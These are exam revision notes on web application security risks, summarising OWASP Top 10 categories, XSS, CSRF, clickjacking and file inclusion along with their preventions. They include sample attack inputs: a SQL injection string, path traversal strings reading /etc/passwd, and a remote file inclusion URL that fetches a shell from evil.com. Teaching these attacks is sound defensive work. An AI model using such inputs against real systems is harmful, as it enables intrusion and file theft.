# Web Application Security Risks – MCQ Exam Notes

## 1. What is Web Application Security?

Web Application Security refers to protecting websites and web applications from attacks that target vulnerabilities in the application, server, database, APIs, and user sessions.

### Security Goals (CIA Triad)

| Goal            | Meaning                                   |
| --------------- | ----------------------------------------- |
| Confidentiality | Prevent unauthorized access to data       |
| Integrity       | Prevent unauthorized modification of data |
| Availability    | Ensure systems remain accessible          |

---

# OWASP Top Web Application Risks

## 1. Broken Access Control (BAC)

Occurs when users can access resources or perform actions beyond their permissions.

### Examples

* Accessing another user's profile by changing ID
* Viewing admin pages without authorization
* Forced browsing

### Impact

* Data theft
* Privilege escalation
* Account takeover

### Prevention

* Server-side authorization checks
* Least privilege principle

### MCQ Points

✅ Most common web vulnerability according to OWASP.

---

## 2. Cryptographic Failures

Improper protection of sensitive data.

### Examples

* HTTP instead of HTTPS
* Weak encryption
* Storing passwords in plain text

### Impact

* Data leakage
* Credential theft

### Prevention

* TLS/HTTPS
* Strong encryption
* Password hashing

### Common Hashing Algorithms

| Algorithm | Secure? |
| --------- | ------- |
| MD5       | ❌ No    |
| SHA1      | ❌ No    |
| bcrypt    | ✅ Yes   |
| Argon2    | ✅ Yes   |
| PBKDF2    | ✅ Yes   |

---

## 3. Injection Attacks

Untrusted input interpreted as commands.

### Types

* SQL Injection
* Command Injection
* LDAP Injection
* NoSQL Injection

### Example

```sql
SELECT * FROM users
WHERE username='admin'
AND password='pass';
```

Malicious input:

```sql
' OR 1=1 --
```

### Impact

* Authentication bypass
* Data theft
* Remote Code Execution

### Prevention

* Parameterized queries
* Input validation
* Prepared statements

### MCQ Point

✅ SQL Injection attacks databases.

---

## 4. Insecure Design

Security flaws in application design.

### Examples

* No rate limiting
* Weak password policy
* No MFA

### Prevention

* Secure SDLC
* Threat modeling
* Security review

---

## 5. Security Misconfiguration

Improper system configuration.

### Examples

* Default credentials
* Directory listing enabled
* Unnecessary services running

### Impact

* Unauthorized access
* Information disclosure

### Prevention

* Harden servers
* Disable unused features
* Security audits

---

## 6. Vulnerable and Outdated Components

Using old software with known vulnerabilities.

### Examples

* Old CMS
* Unpatched libraries
* Legacy frameworks

### Prevention

* Regular patching
* Dependency management

### MCQ Point

✅ Known CVEs often target outdated components.

---

## 7. Identification and Authentication Failures

Weak authentication mechanisms.

### Examples

* Weak passwords
* Credential stuffing
* Session fixation

### Impact

* Account takeover

### Prevention

* MFA
* Strong password policies
* Secure session management

---

## 8. Software and Data Integrity Failures

Trusting unverified software or updates.

### Examples

* Malicious updates
* Supply chain attacks

### Example

Compromised package repository.

### Prevention

* Digital signatures
* Integrity checks

---

## 9. Security Logging and Monitoring Failures

Insufficient logging and alerting.

### Impact

* Delayed breach detection

### Prevention

* Centralized logging
* SIEM implementation

### MCQ Point

✅ Logging helps incident response.

---

## 10. Server-Side Request Forgery (SSRF)

Application fetches remote resources without validation.

### Example

```http
https://site.com/fetch?url=http://internal-server
```

### Impact

* Access internal systems
* Cloud metadata theft

### Prevention

* Allowlists
* Network segmentation

---

# Other Important Web Risks

## Cross-Site Scripting (XSS)

Injecting malicious JavaScript into webpages.

### Types

| Type          | Description           |
| ------------- | --------------------- |
| Stored XSS    | Saved in database     |
| Reflected XSS | Returned immediately  |
| DOM XSS       | Client-side execution |

### Prevention

* Output encoding
* Input validation
* CSP

### MCQ Point

✅ XSS executes in victim's browser.

---

## Cross-Site Request Forgery (CSRF)

Tricks authenticated users into performing actions.

### Example

Changing password without consent.

### Prevention

* CSRF Tokens
* SameSite cookies

### MCQ Point

✅ CSRF exploits trust of website in authenticated user.

---

## Session Hijacking

Attacker steals session token.

### Methods

* XSS
* Network sniffing
* Session fixation

### Prevention

* HTTPS
* Secure cookies
* Session regeneration

---

## Clickjacking

User is tricked into clicking hidden elements.

### Prevention

```http
X-Frame-Options: DENY
```

or

```http
Content-Security-Policy:
frame-ancestors 'none'
```

---

## Directory Traversal

Access files outside intended directory.

Example:

```text
../../../etc/passwd
```

### Prevention

* Path validation
* Allowlists

---

## File Inclusion

### LFI (Local File Inclusion)

```text
?page=../../etc/passwd
```

### RFI (Remote File Inclusion)

```text
?page=http://evil.com/shell.txt
```

### Prevention

* Disable dynamic file inclusion
* Input validation

# One-Line Revision Sheet

* SQLi → Database attack
* XSS → Browser attack
* CSRF → Forced user action
* SSRF → Internal server access
* BAC → Unauthorized access
* IDOR → Access other users' objects
* LFI → Read local files
* RFI → Include remote files
* Session Hijacking → Steal session token
* Clickjacking → Hidden click attack
* Security Misconfiguration → Unsafe settings
* Cryptographic Failure → Weak protection of sensitive data
* Outdated Components → Known vulnerable software
* Authentication Failure → Account compromise
* Logging Failure → Late attack detection

### Placement/University Exam Tip

Remember the mapping:

**SQLi → Database**
**XSS → Browser**
**CSRF → User Action**
**SSRF → Server-to-Server**
**BAC/IDOR → Authorization**
**Session Hijacking → Authentication**

These are the most frequently asked MCQ concepts in aptitude, placement, cybersecurity, and university examinations.
